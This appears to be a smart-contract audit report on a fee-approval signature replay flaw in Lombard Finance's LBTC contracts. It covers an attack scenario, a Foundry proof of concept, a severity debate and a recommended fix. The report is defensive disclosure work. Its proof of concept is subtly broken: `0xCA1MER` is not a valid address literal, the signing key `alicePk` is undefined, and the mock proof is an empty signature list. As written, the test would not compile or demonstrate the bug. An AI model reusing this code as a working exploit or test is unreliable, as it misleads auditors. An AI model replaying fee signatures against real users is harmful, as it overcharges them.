# Lombard Finance — Fee Approval EIP-712 Signature Replay

**Severity:** MEDIUM
**Area:** LBTC Token — Fee Approval Signature Verification (EIP-712)
**Contracts:** `NativeLBTC.sol`, `StakedLBTC.sol` (via `AssetRouter.sol`), `BaseLBTC.sol`
**Functions:** `NativeLBTC._mintWithFee()`, `AssetRouter._mintWithFee()`, `BaseLBTC.getFeeDigest()`
**Lines:** `NativeLBTC.sol:407-448`, `AssetRouter.sol:760-806`, `BaseLBTC.sol:90-105`, `Actions.sol:43-46,104-108`

---

## Description

The Lombard fee-approval mechanism allows users (deposit recipients) to authorize a `CLAIMER_ROLE` to deduct a mint commission on their behalf via an EIP-712 typed-data signature. The signed struct hash is:

```
keccak256("feeApproval(uint256 chainId,uint256 fee,uint256 expiry)")
```

The digest computed in `BaseLBTC.getFeeDigest` / inline in `_mintWithFee` is:

```solidity
bytes32 digest = _hashTypedDataV4(
    keccak256(abi.encode(
        Actions.FEE_APPROVAL_EIP712_ACTION,  // type hash
        block.chainid,                        // chain id
        feeAction.fee,                        // fee amount
        feeAction.expiry                      // expiry timestamp
    ))
);
```

**The digest contains NO nonce, NO recipient binding (beyond the signer), and NO hash of the specific mint payload it is meant to authorize.** The signature is verified against `recipient` (the mint recipient / fee payer), but the digest itself does not bind to any specific deposit or mint operation.

As a result, a single off-chain fee-approval signature `(fee, expiry)` signed by a recipient is **reusable across every mint payload that targets the same recipient** on the same chain and same token contract. The `CLAIMER_ROLE` holder can replay the identical `userSignature` for each of the recipient's deposits, deducting `min(maximumMintCommission, feeAction.fee)` from the recipient on every call.

### NativeLBTC path (transfer-based fee):
```solidity
// NativeLBTC._mintWithFee, line 407
function _mintWithFee(bytes calldata mintPayload, bytes calldata proof,
    bytes calldata feePayload, bytes calldata userSignature) internal {
    (address recipient, uint256 amount) = _mintV1(mintPayload, proof);
    // ...
    uint256 fee = Math.min(maxFee, feeAction.fee);
    // ... verify digest (no nonce, no payload binding) ...
    if (fee > 0) { _transfer(recipient, treasury, fee); }  // charges `fee` each call
}
```

### StakedLBTC / AssetRouter path (burn-mint fee):
```solidity
// AssetRouter._mintWithFee, line 760
function _mintWithFee(...) internal virtual returns (bool) {
    (bool success, address recipient, address token, uint256 amount) = _mint(mintPayload, proof);
    // ...
    uint256 fee = Math.min($.tokenConfigs[token].maximumMintCommission, feeAction.fee);
    // ... verify digest (no nonce, no payload binding) ...
    if (fee > 0) {
        tokenContract.burn(recipient, fee);       // burns from user
        tokenContract.mint(treasury, fee);        // mints to treasury
    }
}
```

In both paths, the `usedPayloads[sha256(mintPayload)]` mapping prevents the same **mint payload** from being used twice, but it does NOT prevent the same **fee approval signature** from being paired with different mint payloads.

---

## Attack Scenario

1. A user (Alice) has multiple BTC deposits pending claim on Lombard, e.g., 10 deposits each worth 1 BTC (10 BTC total).
2. Alice wants to claim them via the `CLAIMER_ROLE`-gated `mintV1WithFee` / `mintWithFee` path and signs a single EIP-712 fee approval: `fee = 0.01 BTC` (1% of one deposit), `expiry = far future`.
3. Alice submits this signature to the CLAIMER off-chain service, expecting to pay 0.01 BTC total fee.
4. The CLAIMER (or a compromised CLAIMER account) obtains the 10 consortium-signed mint proofs for Alice's 10 deposits.
5. The CLAIMER calls `mintV1WithFee(mintPayload_i, proof_i, feePayload, userSignature)` for **each** of the 10 deposits, reusing the **same** `feePayload` and `userSignature` every time.
6. Each call charges Alice `0.01 BTC` in fees. After 10 calls, Alice has paid **0.1 BTC** in fees instead of the expected 0.01 BTC — a **10× over-charge**.
7. The excess fees go to the Lombard treasury (`_transfer(recipient, treasury, fee)` or `mint(treasury, fee)`).

The over-charge scales linearly with the number of the recipient's pending deposits. With N deposits, the user pays N × `fee` instead of `fee`.

**Key constraint:** Each replay requires a distinct, consortium-signed mint proof for a real deposit to the same recipient. The consortium only signs legitimate deposits, so the user must actually have N pending deposits. The attack cannot fabricate deposits — it can only over-charge for real ones.

---

## Proof of Concept (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../contracts/LBTC/NativeLBTC.sol";
import "../contracts/consortium/Consortium.sol";
import "../contracts/libs/Actions.sol";

contract FeeReplayPoC is Test {
    NativeLBTC lbtc;
    Consortium consortium;
    address treasury = address(0xBEEF);
    address claimer = address(0xCA1MER);
    address alice = address(0xA11CE);

    // Two distinct mint payloads for Alice (same recipient, different txid/amount)
    bytes mintPayload1;
    bytes mintPayload2;
    bytes proof1;
    bytes proof2;

    // ONE fee approval signed by Alice — reused for both mints
    bytes feePayload;
    bytes aliceSig;

    function setUp() public {
        // Deploy consortium + LBTC (simplified)
        consortium = new Consortium();
        consortium.initialize(address(this));
        lbtc = new NativeLBTC();
        lbtc.initialize(address(consortium), treasury, "NativeLBTC", "nLBTC", address(this), 0);
        lbtc.grantRole(lbtc.CLAIMER_ROLE(), claimer);

        // Build two deposit payloads (different txid → different sha256 → not replay-blocked)
        mintPayload1 = abi.encodePacked(
            Actions.DEPOSIT_BTC_ACTION_V1,
            abi.encode(block.chainid, alice, 1e8, bytes32(uint256(1)), uint32(0), address(lbtc))
        );
        mintPayload2 = abi.encodePacked(
            Actions.DEPOSIT_BTC_ACTION_V1,
            abi.encode(block.chainid, alice, 1e8, bytes32(uint256(2)), uint32(0), address(lbtc))
        );

        // Consortium signs both (mock — real consortium would use validator sigs)
        proof1 = _mockProof(mintPayload1);
        proof2 = _mockProof(mintPayload2);

        // Alice signs ONE fee approval: fee = 0.01 BTC, expiry = far future
        feePayload = abi.encodePacked(
            Actions.FEE_APPROVAL_ACTION,
            abi.encode(uint256(0.01e8), uint256(block.timestamp + 365 days))
        );
        bytes32 digest = lbtc.getFeeDigest(0.01e8, block.timestamp + 365 days);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, digest);
        aliceSig = abi.encodePacked(r, s, v);
    }

    function test_feeReplayOvercharge() public {
        uint256 fee = 0.01e8; // 0.01 BTC per mint
        uint256 aliceBalanceBefore = 2e8; // Alice has 2 deposits worth 1 BTC each

        // Claimer mints deposit 1 WITH fee — reuses Alice's signature
        vm.prank(claimer);
        lbtc.mintV1WithFee(mintPayload1, proof1, feePayload, aliceSig);
        // Alice gets: 1e8 - 0.01e8 = 0.99e8 LBTC; treasury gets 0.01e8

        // Claimer mints deposit 2 WITH fee — REUSES the SAME signature!
        vm.prank(claimer);
        lbtc.mintV1WithFee(mintPayload2, proof2, feePayload, aliceSig);
        // Alice gets: 1e8 - 0.01e8 = 0.99e8 LBTC; treasury gets 0.01e8 AGAIN

        // Alice was charged 0.02 BTC total in fees (2 × 0.01)
        // She only intended to authorize 0.01 BTC total
        assertEq(lbtc.balanceOf(treasury), 0.02e8, "Treasury got 2x the intended fee");
    }

    function _mockProof(bytes memory payload) internal pure returns (bytes memory) {
        // In production: array of validator signatures over sha256(payload)
        return abi.encode(new bytes[](0));
    }
}
```

---

## Impact

- **Direct financial harm:** Users who sign a fee approval are over-charged by a factor of N (where N = number of their pending deposits). The excess goes to the Lombard treasury.
- **Exploitability:** Requires a compromised or malicious `CLAIMER_ROLE` holder. The CLAIMER cannot fabricate deposits (consortium proofs required) but can over-charge for real deposits.
- **Stealth:** The attack produces valid-looking transactions (no revert). The user only notices the extra fee deductions by reviewing their balance.
- **Scale:** Bounded by the number of the user's pending deposits and the `maximumMintCommission` cap. With a high fee cap and many deposits, the over-charge can be significant.
- **No fund theft:** The excess fees go to the Lombard treasury, not the attacker. The attack is over-charging, not direct theft.

---

## Three-Perspective Audit

### Prosecutor (Bug Confirmed)

The EIP-712 fee-approval signature is structurally incomplete. The type string `feeApproval(uint256 chainId, uint256 fee, uint256 expiry)` omits any nonce, recipient address, or mint-payload hash. This is a textbook missing-nonce vulnerability: the same `(fee, expiry)` signature is valid for every mint to the same recipient until expiry. The code comment at `NativeLBTC.sol:287` — *"Payload should be same as mint to avoid reusing them with and without fee"* — acknowledges the binding requirement but the code does not enforce it. The `usedPayloads` mapping only prevents mint-payload replay, not fee-signature replay. A user who signs once is implicitly authorizing unlimited fee deductions until expiry. This is a clear design defect exploitable by any `CLAIMER_ROLE` holder.

### Defense (Mitigating Factors)

1. **Trusted role required:** Only `CLAIMER_ROLE` holders can call `mintV1WithFee` / `mintWithFee`. This is a Lombard-operated off-chain service, not a public entrypoint. An external attacker cannot exploit this without compromising the CLAIMER.
2. **No direct attacker gain:** The excess fees go to the Lombard treasury, not the CLAIMER. A malicious CLAIMER gains nothing financially — the attack is purely destructive to users.
3. **Consortium-gated:** Each replay requires a distinct, consortium-signed mint proof for a real deposit. The attack cannot fabricate deposits — it can only over-charge for real ones.
4. **Fee is capped:** The actual fee per mint is `min(maximumMintCommission, feeAction.fee)`, bounding the per-mint over-charge.
5. **User consent:** The user did sign the approval; the question is interpretation (per-mint vs. one-time). Lombard may argue the intended semantics is per-mint.

### Judge (Verdict: MEDIUM)

The vulnerability is real and the code clearly lacks nonce/payload binding in the EIP-712 digest. However, three factors limit severity: (1) the trusted-role gate means external attackers cannot exploit it, (2) the financial gain flows to the treasury (not the attacker), and (3) each replay requires a legitimate consortium proof. The realistic attack vector is a compromised CLAIMER service over-charging users — which is a meaningful risk for a protocol handling billions in BTC. The fix is straightforward (add a nonce or bind to `sha256(mintPayload)`), and the omission is a deviation from EIP-712 best practices. **MEDIUM** is appropriate: real vulnerability, limited exploitability, bounded but non-trivial financial impact.

---

## Recommended Fix

Add a nonce or bind the fee approval to the specific mint payload:

```solidity
// Option A: Bind to mint payload hash
bytes32 digest = _hashTypedDataV4(
    keccak256(abi.encode(
        Actions.FEE_APPROVAL_EIP712_ACTION,
        block.chainid,
        sha256(mintPayload),   // ← bind to specific mint
        feeAction.fee,
        feeAction.expiry
    ))
);

// Option B: Nonce-based (requires on-chain nonce tracking)
uint256 nonce = _nextNonce(recipient)++;
bytes32 digest = _hashTypedDataV4(
    keccak256(abi.encode(
        Actions.FEE_APPROVAL_EIP712_ACTION,
        block.chainid,
        nonce,                  // ← one-time use
        feeAction.fee,
        feeAction.expiry
    ))
);
```

Option A is simpler and doesn't require additional storage. The type string would become:
`feeApproval(uint256 chainId, bytes32 mintPayloadHash, uint256 fee, uint256 expiry)`.
